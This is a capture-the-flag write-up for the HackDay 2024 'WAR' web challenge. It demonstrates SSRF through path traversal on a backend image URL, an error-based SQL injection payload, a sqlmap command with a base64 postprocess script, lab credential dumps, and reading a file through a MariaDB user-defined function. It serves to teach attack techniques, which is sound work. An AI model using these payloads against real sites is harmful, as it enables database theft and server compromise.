# WAR Write-up

## Challenge Overview

- **Name:** WAR
- **Author:** PotatoTeacher (Rob)
- **Category:** Web
- **Points:** 464

## Challenge Description

A website representing the various links between the nations of the world has been identified and it is suspected that the syndicate is using this site to enable certain countries to better prepare their attacks. Your mission is to find the syndicate's hidden messages on the site.
## Challenge Goal

The flag can be found under the /flag/flag.txt 
## Initial Reconnaissance

Upon connecting to the webserver we discover a website proposing two main features:
- war-web.php 
- contact.php

The homepage also inform us about the following:
`The website is still under development. Some features are being manualy added.`

When submitting the contact form we can see in the response the following HTML comment:

`<!-- Honestly we do not have time to check your messages ... -->`
*Probably meaning a deadend ?*

## Focus on war-web.php

When submitting a get request with the `Country` parameter set we obtained a list of the country past and current military alliances.
Example: `http://CHALL:8090/war-web.php?country=Republic+of+Venice&flag=0`

As we can see, there is another GET parameter present in the request `flag` and it is set to 0 by default.
If we set it to 1 with the same country name we can observe a new HTML comment in the response:
URL tested: `http://CHALL:8090/war-web.php?country=Republic+of+Venice&flag=1`
New HTML comment in the response: `<!-- 404 -->`

While try other country name we can see that when requesting some country names with the `flag` parameter 1 the website renders the country flag. 
URL tested: `http://CHALL:8090/war-web.php?country=France&flag=1`

![france_flag](https://github.com/ChallengeHackDay/2024-qualif/assets/40593456/2ec498b9-e74a-4ff3-a5f6-32c9fb93c50f)

Let's study this image.
The image is rendered using the `img` src attribute with png base64 data.

Example for France: `data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAGQAAABDBAMAAACYZb3pAAAAHlBMVEU/QWPsGSD70tObh5n4qq0FFEDsGSD///+CiZ/6xsj0M3UIAAAABXRSTlP7wO/15OfQLf8AAAAzSURBVEjH7cuxDQAgCABBiIMwlXs7kjV0tua+/ORyR2/VGHXGSARBEARBEARBkI9JPJMLUC5doUB41rcAAAAASUVORK5CYIJJbWFnZSBnZW5lcmF0ZWQgdGhhbmtzIHRvIG91ciBwcml2YXRlIGJhY2tlbmQgQVBJLiBVUkw6aHR0cDovL3dhci1iYWNrZW5kL3B1YmxpYy9pbWFnZXMvRnJhbmNlLnBuZw==`

Who doesn't like to decode b64 ?:
`echo iVBORw[...] | base64 -d
[...Classic PNG data...] xIEND B`` Image generated thanks to our private backend API. URL:http://war-backend/public/images/France.png
`

So we understand that the image is being "generated" using a private backend API with the URL "http://war-backend/public/images/France.png".

Now let's test the `country` parameter with the `flag` parameter set to 1:
| Country value     | Response | Comment |
| :---------------- | :------: | ----: |
| `France`        |   `data:image/png;base64, iVB[...]`   | Outputs image in base64 |
| `Republic+of+Venice`        |   `<!-- 404 -->`   | Outputs 404 |
| `%0A`        |   `<!-- 0 -->`   | Some kind of error ? |
| `../`        |   `<!-- 404 -->`   | Outputs 404 |
| `France.png%23`        |   `data:image/png;base64, iVB[...]`   | Outputs image in base64 |
| `../images/France.png%23`        |   `data:image/png;base64, iVB[...]`   | Outputs image in base64 |
| `../../../../%23`        |   `<!-- 403 -->`   | Outputs 403 |

When setting the `country` parameter to `France.png%23` or `France.png%3f` we observed that the image is rendered and that the trailing base64 data is:
- `Image generated thanks to our private backend API. URL:http://war-backend/public/images/France.png#.png`
- `Image generated thanks to our private backend API. URL:http://war-backend/public/images/France.png?.png`

Those characters allow us to patch the HTTP request made by the front web server to the backend.
- `?` makes suffix data `.png` to be interpreted by the backend server as a GET parameter. 
- `#` makes suffix data `.png` to be interpreted by the backend server as a fragment identifier. 

Using `../images/France.png%23` we can see that we can also use path traversal techniques to patch the HTTP request.

## Server-Side Request Forgery ?

So far we have identified that the front web server is making HTTP requests to a private backend.
We also identified that 404 and 403 answers are rendered as HTLM comment.
We are not sure about the `<!-- 0 -->`, probably how the front server renders its HTTP request errors.

While testing classic SSRF payloads/techniques we know that:
- We can't change the protocol used: `http://` 
- We can't change the port used because the `/` character is already set within the base URL
- We can patch the request to remove the `.png` suffix
- We can change the path and go in the parent web parent directory. e.g. `../images/`

Two approaches could be used here to discover more content on the backend webserver:
- Fuzzing using the `country` parameter with `#` or `?` suffix and a typical dictionnary
- Analyzing the classic message rendered:
`Image generated thanks to our private backend API. URL:http://war-backend/public/images/France.png`
`/public/` in the URL + mention of `private backend` can tips us to try accessing a `/private/` web folder.

Payload: `http://CHALL:8090/war-web.php?country=../../../../private/%3f&flag=1`
Response: `<img src='data:image/png;base64, Cjwh[...]LnBuZw=='/>`

On the web page the image is not loaging but the b64 decoded response is the following:
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" random="D3v0t34M">
    <title>WAR Admin</title>
    <style>
      [... CSS ...]
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login Form</h2>
        <form class="login-form" method="POST" target="/private/message.php">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <!-- 
        <form class="login-form" method="GET" target="/private/message.php">
            <input type="text" name="passcode" placeholder="passcode" required>
            <button type="submit">Login</button>
        </form>
         -->
    </div>
</body>
</html>
Image generated thanks to our private backend API. URL:http://war-backend/public/images/../../../../private/?.png
```

If we render it:

![private_backend](https://github.com/ChallengeHackDay/2024-qualif/assets/40593456/196b971d-6c03-4e61-a83d-1238c9b152af)

The `/private/` page has 2 forms in it, one using POST request and another, commented, using GET request targeting `/private/message.php`.

#### Since we can only impact the URL used by the front web server only the GET form can be used.

## Focus on /private/message.php

Now we have the payload `http://CHALL:8090/war-web.php?country=../../../../private/message.php%3f&flag=1` to interact with the `/private/message.php` page and the backend HTTP response when the HTTP response code is `200` within the `img` `src` base64 data.

On `/private/` the commented form is indicatig that the `/private/message.php` page is excpecting a `passcode` GET parameter.
Since we don't know any passcodes let's try: `http://CHALL:8090/war-web.php?country=../../../../private/message.php?passcode=1%3f&flag=1`

![private_message](https://github.com/ChallengeHackDay/2024-qualif/assets/40593456/0e14ddf6-e6ae-454c-b8a1-664e47876138)

Hmm just an empty message table.

From here we can try:
- Bruteforcing the passcode parameter (not necessary)
- Testing the passcode parameter for common web vulnerabilities (when you don't know, always test the classics)

With a simple `'` character in the `passcode` parameter we obtained the following response:
- Payload: `http://CHALL:8090/war-web.php?country=../../../../private/message.php?passcode='%3f&flag=1`
- Backend response: 
`mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?.png')' at line 1 in /var/www/html/private/message.php:73 Stack trace: #0 /var/www/html/private/message.php(73): mysqli_query(Object(mysqli), 'SELECT message_...') #1 {main}`

## SQL Injection and database post exploitation

Now that we have a confirmed SQL Injection when can list the current databases tables and dump their content.
Thanks to the raised mysqli_sql_exception we know it is an error-based injection.

### Manual
- SQL Injection Error Based payload: `1' AND extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))= 'a`
- Full payload: `http://CHALL:8090/war-web.php?country=../../../../private/message.php?passcode=1'+AND+extractvalue(0x0a,concat(0x0a,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1)))=+'a%3f&flag=1`
- Response: `mysqli_sql_exception: XPATH syntax error: '`messages`' in /var/www/html/private/message.php:73 Stack trace: #0 /var/www/html/private/message.php(73): mysqli_query(Object(mysqli), 'SELECT message_...') #1 {main}`

### sqlmap
While setting up our sqlmap we need to configure the injection point and the fact that we need the payload to be URL compliant and post process the response so that sqlmap can understand the base64 data.
- sqlmap command: `sqlmap -u 'http://CHALL:8090/war-web.php?country=../../../../private/message.php?passcode=%INJECT HERE%%3f&flag=1' --technique=E --tamper=space2plus --postprocess=postprocess/b64answer.py --skip-urlencode -v --tables`

#### ./postprocess/b64answer.py :
```
#!/usr/bin/env python
import re
import base64

def decode_base64(base64_data):
    try:
        decoded_data = base64.b64decode(base64_data).decode("ascii")
        return decoded_data
    except Exception as e:
        print(f"Error decoding base64 data: {str(e)}")
        return ""

def postprocess(page, headers=None, code=None):
    base64_matches = re.findall(r'data:image/png;base64,([^\']+)', page)
    # Decoding the base64 data
    decoded_data = ""
    if len(base64_matches):
      decoded_data = decode_base64(base64_matches[0])

    baseresponse = '''HTTP/1.1 200 OK
Date: Sat, 27 Jan 2024 11:30:40 GMT
Server: Apache/2.4.57 (Debian)
X-Powered-By: PHP/8.3.1
Vary: Accept-Encoding
Content-Length: {content_length}
Connection: close
Content-Type: text/html; charset=UTF-8

'''.format(content_length=len(decoded_data))

    newpage = baseresponse + decoded_data
    
    return newpage if len(base64_matches) else page, headers, code
```
### Listing WARAdmin database messages and users

Using the techniques described above we can list the messages and users tables:

`sqlmap -u 'http://CHALL:8090/war-web.php?country=../../../../private/message.php?passcode=%INJECT HERE%%3f&flag=1' --technique=E --tamper=space2plus --postprocess=postprocess/b64answer.py --skip-urlencode -v --sql-shell`

#### Content of the users table:
```
SELECT * FROM users [3]:
[*] 2024-01-27 09:09:16, admin@domain.local, 0000, H4kD4y, 1, admin
[*] 2024-01-27 09:09:16, devoteam@domain.local, 1234, D3V0T43M, 2, devoteam
[*] 2024-01-27 09:09:16, esiee@domain.local, 9999, ScH00l, 3, esiee
```

#### Content of the message table:
```
SELECT * FROM messages [7]:
[*] Hello there!, 1, 3, 1
[*] Meeting at 2 PM tomorrow., 2, 3, 2
[*] FIND THE FLAG., 3, 2, 3
[*] Don't forget to submit the report., 4, 1, 3
[*] Happy Birthday!, 5, 2, 1
[*] Not working... I should try to define my own method, 6, 3, 3
[*] Final project presentation on Friday., 7, 3, 2
```

# Post exploit

From here we  need to think about what we want to obtain.

Going back to the objective of the challenge: 
* Retrieving the flag located in `/flag/flag.txt` as described in the challenge description.

We try the classic function to read local file in MySQL/MariaDB:
- Subpayload: `SELECT LOAD_FILE('/flag/flag.txt')`
- Result blank...

To check our file reading rights in the DB we can check the permissions with the following query:
- `select user();` : root
- `select user,file_priv from mysql.user;` : `[*] root, Y ; [*] mysql.session, N ; [*] mysql.sys, N ; [*] root, Y`
- `select @@secure_file_priv;` : `/var/lib/mysql-files/`

Based on those information we know that `LOAD_FILE` won't work here.

_Different methods of manual or automated MySQL/Mariadb enumeration could help_

A hint was present within the `message` tables:
* `Not working... I should try to define my own method`

With the following Google research `mariadb define own method` we find:

![google_search](https://github.com/ChallengeHackDay/2024-qualif/assets/40593456/014b9117-8818-41e9-b2a1-78923e9e10d3)
![udf_table](https://github.com/ChallengeHackDay/2024-qualif/assets/40593456/da7697ea-8e01-44dc-9ba2-55cf43bb6df2)

So using the documentation we query the following:
- Query: `SELECT * FROM mysql.func ;`
- Response: `read_file`

Since User Defined Functions (UDF) can be used as regular functions we will try to read the flag with it:
- Query: `SELECT read_file("/flag/flag.txt") ;`
- Response: `HACKDAY{SsRf_AnD_UDf_W0W!_m}`

# Notes from the author

I made this challenge for the following purposes:
- Present a *kind-of* realistic SSRF vulnerability
- Highlight the fact that all SSRF doesn't involve changing protocols or HTTP methods (GET parameters ftw)
- Propose a post exploitation on a database
- Highlight the fact that common MySQL/MariaDB cheatsheets forget to list the `mysql.func` table

It was inspired by real-life pentests experiences.
